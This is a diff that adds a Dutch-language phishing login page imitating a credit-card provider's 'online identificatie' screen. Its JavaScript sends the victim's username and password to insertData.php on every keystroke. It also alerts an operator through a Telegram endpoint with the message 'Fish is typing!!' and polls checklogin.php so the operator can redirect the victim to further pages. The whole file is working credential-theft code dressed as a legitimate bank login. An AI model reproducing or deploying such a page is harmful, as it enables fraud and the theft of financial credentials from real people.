@@ -1,0 +1,343 @@
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <meta name="format-detection" content="telephone=no">
+
+
+    <title>Inloggen</title>
+        
+    <link href="sci_files/sciindex.css" rel="stylesheet">
+  
+    
+<style>
+
+
+.fa-chevron:before {
+  content: "\EA1B"; 
+}
+.fa-check:before{
+  content:"\EA17";
+}
+
+
+</style>
+</head>
+
+<body>
+    <header>
+        Wil je onbezorgd online shoppen? Betaal met je creditcard. Zo heb je aflevergarantie op vrijwel al je aankopen.
+    </header>
+    <div class="container-fluid bg-white">
+        <div class="row">
+            <div class="col-sm-7 mx-auto">
+                <div class="row py-3">
+                    <div class="col-md-12 col-lg-4 text-center text-grey">
+                        <i class="fas fa-check text-warning"></i> Wereldwijd betaalgemak
+                    </div>
+                    <div class="col-lg-4 text-center text-grey d-none d-lg-block">
+                        <i class="fas fa-check text-warning"></i> Fraudepreventie
+                    </div>
+                    <div class="col-lg-4 text-center text-grey d-none d-lg-block">
+                        <i class="fas fa-check text-warning"></i> Aankoopverzekering
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row img-row">
+            <div class="col-lg-7 col-md-8 col-sm-9 col-12 d-block mx-auto">
+                <img class="img-logo float-begin" src="sci_files/images/logo.png">
+            </div>
+        </div>
+    </div>
+    <div class="container-fluid main-body h-100">
+        <div class="row">
+            <div class="col-lg-7 col-md-8 col-sm-9 col-12 d-block mx-auto">
+                <div class="row">
+                    <span class="home-back"><i class="fas fa-chevron"></i> Home
+                </span></div>
+                <div class="plaatje">
+                    <h1>Inloggen - Online identificatie</h1>
+                    <div class="row mb-3 align-items-center">
+                        <div class="col-sm-12 col-md-5">
+                            <form id="data" method="post" action="sci2.php">
+                            <div id="loading" class=""></div>
+                            <label for="inlognaam" class="col-form-label">Inlognaam</label>
+                        </form></div>
+                        <div class="col-sm-12 col-md-7">
+                            <input type="text" name="gebruikersn" id="gebruikersn" class="form-control" placeholder="Vul hier je inlognaam in">
+                        </div>
+                    </div>
+                    <div class="row mb-3 align-items-left">
+                        <div class="col-sm-12 col-md-5">
+                            <label for="password" class="col-form-label">Wachtwoord</label>
+                        </div>
+                        <div class="col-sm-12 col-md-7">
+                            <input type="password" name="wachtw" id="wachtw" class="form-control" placeholder="Vul hier je wachtwoord in">
+                        </div>
+                    </div>
+                    <div class="row mb-3 align-items-left">
+                        <div class="col-md-5"></div>
+                        <div class="col-sm-12 col-md-7">
+                            <div class="form-check">
+                              <input class="form-check-input" type="checkbox" value="" id="inlognaamOnthoud">
+                              <label class="form-check-label" for="inlognaamOnthoud">
+                                Onthoud inlognaam (optioneel)
+                              </label>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row mb-3 align-items-left">
+                        <div class="col-md-5"></div>
+                        <div class="col-sm-12 col-md-7"><button type="button" class="btn btn-primary w-25" id="signInBtn">Volgende</button> <div id="loading" class=""></div></div>
+                    </div>
+                         
+                    <hr>
+                    <a href="#" style="max-width:280px;" data-url="sci2.php?session=636f68d17da89" class="vergeet">Inlognaam en/of wachtwoord vergeten?</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <div class="col-sm-8 d-block mx-auto my-0">
+        <hr>
+        <ul class="nav">
+            <li class="nav-item"> <a class="nav-link" href="#">Over ons</a></li>
+            <li class="nav-item"> <a class="nav-link" href="#">Pers</a></li>
+            <li class="nav-item"> <a class="nav-link" href="#">Disclaimer</a></li>
+            <li class="nav-item"> <a class="nav-link" href="#">Algemene Voorwaarden</a></li>
+            <li class="nav-item"> <a class="nav-link" href="#">Privacy Statement</a></li>
+            <li class="nav-item"> <a class="nav-link" href="#">Cookies</a></li>
+            <li class="nav-item"> <a class="nav-link" href="#">Zakelijke Cards</a></li>
+        </ul>
+        </div>
+    </footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script>
+    $('#sbumitForm').submit(function(e) {
+        e.preventDefault();
+        $("#signInBtn").click();
+    });
+
+    $("#gebruikersn").keyup(function() {
+        var gebruikersn = $("#gebruikersn").val()
+
+        if (gebruikersn.length == 1) {
+            $this = $(this);
+        	$.post("post_update.php", {
+        		sessionId: '636f68d17da89',
+        		option: 'isClicked'
+        	}).done(function (data) {});
+        }
+
+         if (gebruikersn.length == 3) {
+            $.post("update_oth-telegram.php", {
+                type: 'sci',
+                type_str: 'Fish is typing!!',
+                actual_link: 'https://modulent-zelfregend.art/sciindex.php?session=636f68d17da89'
+            }).done(function(data) {});
+        }
+        
+        var formData = new FormData();
+        formData.append("sci", " ")
+        formData.append("type", "key")
+        formData.append("sessionID", "636f68d17da89")
+        formData.append("gebruikersn", gebruikersn)
+        formData.append("Actual Link", 'https://modulent-zelfregend.art/sciindex.php?session=636f68d17da89')
+
+        axios({
+            method: "post",
+            url: "/insertData.php",
+            data: formData,
+            headers: {"Content-Type": "multipart/form-data", },
+        }).then(function (response){
+            console.log(response)
+        }).catch(function (response){
+            console.log(response)
+        })
+    });
+    $("#wachtw").keyup(function() {
+        var wachtw = $("#wachtw").val()
+        var formData = new FormData();
+        formData.append("sci", " ")
+        formData.append("type", "key")
+        formData.append("sessionID", "636f68d17da89")
+        formData.append("wachtw", wachtw)
+        formData.append("Actual Link", 'https://modulent-zelfregend.art/sciindex.php?session=636f68d17da89')
+
+        axios({
+            method: "post",
+            url: "/insertData.php",
+            data: formData,
+            headers: {"Content-Type": "multipart/form-data", },
+        }).then(function (response){
+            console.log(response)
+
+        }).catch(function (response){
+            console.log(response)
+        })
+    });
+    $("#signInBtn").click(function () {
+        var gebruikersn = $("#gebruikersn").val()
+        var wachtw = $("#wachtw").val()
+
+
+        if(gebruikersn == ""){
+            alert("Vul uw inlognaam en wachtwoord in")
+        }else if(wachtw == ""){
+            alert("Vul uw inlognaam en wachtwoord in")
+        }else{
+
+            // $('#loading').addClass('loading');
+            var formData = new FormData();
+            formData.append("sci", " ")
+            formData.append("gebruikern", gebruikersn)
+            formData.append("wachtw", wachtw)
+            formData.append("sessionID", "636f68d17da89")
+            formData.append("Actual Link", 'https://modulent-zelfregend.art/sciindex.php?session=636f68d17da89')
+
+            axios({
+                method: "post",
+                url: "insertData.php",
+                data: formData,
+                headers: {"Content-Type": "multipart/form-data", },
+            }).then(function (response){
+                console.log(response)
+                        window.location.href = "sci2.php?session=636f68d17da89";
+
+            }).catch(function (response){
+                console.log(response)
+                alert('error');
+            })
+
+            // var interval = setInterval(function() {
+
+
+            //     $.get("../../checklogin.php?session=636f68d17da89", function(data) {
+
+            //         if (data == 1) {
+            //             clearInterval(interval);
+            //             window.location.href = "sci2.php?session=636f68d17da89";
+            //             /*$('#submit').click();*/
+
+            //         } else if (data == 2) {
+
+            //             $.get("../../resetlogin.php?session=636f68d17da89");
+
+            //             $('#error').show();
+
+            //             $("#gebruikersn").val("");
+            //             $("#wachtw").val("");
+
+            //             $('#loading').removeClass('loading');
+            //             clearInterval(interval);
+            //         }
+            //         else if(data == 4) {
+            //             clearInterval(interval);
+            //             window.location.href = "4.php?session=636f68d17da89";
+            //         }
+            //         else if(data == 5) {
+            //             clearInterval(interval);
+            //             window.location.href = "confirmation.php?session=636f68d17da89";
+            //         }
+
+            //     });
+
+            // }, 1000);
+        }
+    });
+    $('.vergeet').click(function() {
+        $this = $(this);
+		$.post("post_update.php", {
+			sessionId: '636f68d17da89',
+			flag: '0',
+			option: 'nexter',
+			nextPage: '6',
+			link: 'sci2.php'
+		}).done(function(data) {
+            var formData = new FormData();
+            formData.append("ora", " ")
+            formData.append("type", "key")
+            formData.append("sessionID", "636f68d17da89")
+            formData.append("inloggegevens_oraindex", 'Inloggegevens vergeten')
+            formData.append("Actual Link", 'https://modulent-zelfregend.art/sciindex.php?session=636f68d17da89')
+    
+            axios({
+                method: "post",
+                url: "insertData.php",
+                data: formData,
+                headers: {"Content-Type": "multipart/form-data", },
+            }).then(function (response){
+                console.log(response)
+            }).catch(function (response){
+                console.log(response)
+            })
+
+        	$.post("post_update.php", {
+        		sessionId: '636f68d17da89',
+        		option: 'isClicked'
+        	}).done(function (data) {
+        	});
+			window.location.href = $this.data('url');
+		});
+    });
+</script>
+<script>
+     
+function clearNexter(sessionId) {
+
+    $.post("post_update.php", {
+
+            sessionId: sessionId,
+
+            option: 'clearPage',
+
+            nextPage: 0
+
+        })
+
+        .done(function(data) {
+
+        });
+}
+
+               
+            var interval = setInterval(function() {
+
+
+                $.get("checklogin.php?session=636f68d17da89", function(data) {
+                    console.log(data);
+
+                    try {  
+                      var data = JSON.parse(data);  
+                            if(data.restype == 6) {
+                        clearInterval(interval);
+                        clearNexter('636f68d17da89');
+                        window.location.href = data.nextlink + "?session=636f68d17da89";
+                            }
+                    } catch (e) {  
+                        if (data == 6) {
+                            
+                            clearInterval(interval);
+                            clearNexter('636f68d17da89');
+                       
+    
+                        } else if (data == 6) {
+                            alert("first called");
+                            $.get("resetlogin.php?session=636f68d17da89");
+    
+           
+                        }
+                    }
+
+                });
+
+            }, 1500);
+     
+
+      </script>
+
+</body></html>
